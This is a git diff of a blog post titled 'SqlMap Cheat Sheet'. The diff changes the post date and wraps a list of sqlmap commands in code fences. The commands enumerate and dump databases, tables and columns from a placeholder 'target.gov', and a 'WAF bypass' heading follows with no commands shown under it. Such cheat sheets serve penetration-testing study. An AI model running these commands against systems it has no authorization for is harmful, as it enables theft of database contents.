@@ -1,6 +1,6 @@
 ---
 title: "SqlMap Cheat Sheet"
-date: 2022-08-29 23:00:00 +07:00
+date: 2022-08-29 22:30:00 +07:00
 categories: [Cheat]
 tags: [Cheat Sheet, WriteUps]
 image: 
@@ -9,6 +9,7 @@ image:
 # SQLmap Special Command       
 
 # 1. BASIC COMMAND SQLMAP
+```
 - sqlmap -u "target.gov" --dbs --batch
 
 - sqlmap -u "target.gov" -D ( name database ) --columns --batch
@@ -16,6 +17,7 @@ image:
 - sqlmap -u "target.gov" -D ( name database ) -T ( name table ) --columns --batch 
 
 - sqlmap -u "target.gov" -D ( name database ) -T ( name table ) -C ( name column ) --dump --batch
+```
 
 # 2. WAF BYPASS TYPE
 ## all bypass waf forbidden
